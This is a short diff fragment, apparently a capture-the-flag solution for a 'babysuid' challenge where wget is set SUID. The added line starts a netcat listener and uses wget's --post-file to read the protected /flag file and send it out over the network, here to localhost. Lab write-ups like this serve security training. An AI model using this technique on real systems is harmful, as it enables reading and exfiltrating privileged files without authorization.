@@ -14,4 +14,4 @@ this challenge container to make sure that I set the SUID bit on /usr/bin/wget!
 
 //SOLUZIONE
 
-
+hacker@babysuid_level50:~$ nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888
